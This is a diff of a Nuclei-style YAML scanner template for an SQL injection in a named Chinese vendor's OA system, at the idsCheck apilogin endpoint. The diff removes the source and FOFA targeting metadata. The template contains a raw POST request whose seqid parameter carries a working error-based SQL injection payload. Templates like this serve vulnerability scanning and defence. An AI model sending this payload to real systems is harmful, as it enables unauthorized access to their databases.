@@ -3,12 +3,8 @@ info:
   name: 思普信息技术有限公司办公OA系统idsCheck apilogin存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xli9fxsydf2ccmiy'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xli9fxsydf2ccmiy
-    fofa: icon_hash="-403479360"
 http:
 - raw:
   - 'POST /IdsCenter/idsCheck?p=apilogin HTTP/1.1
@@ -28,9 +24,7 @@ http:
     X-Requested-With: XMLHttpRequest
 
 
-    seqid=1''+AND+6884+IN+(SELECT+(CHAR(113)+CHAR(106)+CHAR(113)+CHAR(112)+CHAR(113)+(SELECT+(CASE+WHEN+(6884=6884)+THEN+CHAR(49)+ELSE+CHAR(48)+END))+CHAR(113)+CHAR(112)+CHAR(113)+CHAR(113)+CHAR(113)))--+cxaC&datasource=EOMP1
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1733226576874-7932f7e3-4c1b-4ff6-9b8b-5db1c0c30c29.png)'
+    seqid=1''+AND+6884+IN+(SELECT+(CHAR(113)+CHAR(106)+CHAR(113)+CHAR(112)+CHAR(113)+(SELECT+(CASE+WHEN+(6884=6884)+THEN+CHAR(49)+ELSE+CHAR(48)+END))+CHAR(113)+CHAR(112)+CHAR(113)+CHAR(113)+CHAR(113)))--+cxaC&datasource=EOMP1'
   redirects: false
   matchers:
   - status:
